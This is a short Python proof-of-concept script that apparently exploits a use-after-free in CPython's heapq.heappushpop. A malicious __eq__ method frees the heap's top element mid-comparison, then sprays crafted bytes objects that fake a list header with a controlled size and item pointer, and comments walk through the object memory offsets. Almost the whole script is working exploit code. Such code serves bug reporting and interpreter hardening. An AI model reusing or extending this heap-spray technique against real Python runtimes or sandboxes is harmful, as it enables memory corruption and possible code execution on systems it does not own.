import heapq
import sys


class Evil1:
    def __eq__(self, other):
        print('In Evil1.__eq__')
        # Free the list top
        heap[0] = None
        
        # We need a bytes object of size 56.
        # sys.getsizeof(b"A"*23) is 56.
        # We need ob_size >= 2 so the loop continues.
        # ob_size is at bytes offset 32 (ob_sval[0..7])
        # ob_item is at bytes offset 40 (ob_sval[8..15])
        
        # Let's craft the payload.
        # We want to set ob_size = 2
        # We want to set ob_item = 0x4141414141414141
        # ob_sval starts at index 0 of the string.
        # So we just pack these:
        payload = (2).to_bytes(8, 'little') + (0x4141414141414141).to_bytes(8, 'little') + b'X'*7
        
        # Check size
        assert len(payload) == 23
        
        global spray
        spray = [payload for _ in range(1000)]
        
        return True

class Evil2:
    def __gt__(self, other):
        print('In Evil2.__gt__')
        return True

heap = [[Evil1(), 0]]
print('Calling heappushpop...')
try:
    heapq.heappushpop(heap, [0, Evil2()])
except Exception as e:
    print('Exception:', e)
print('Done')
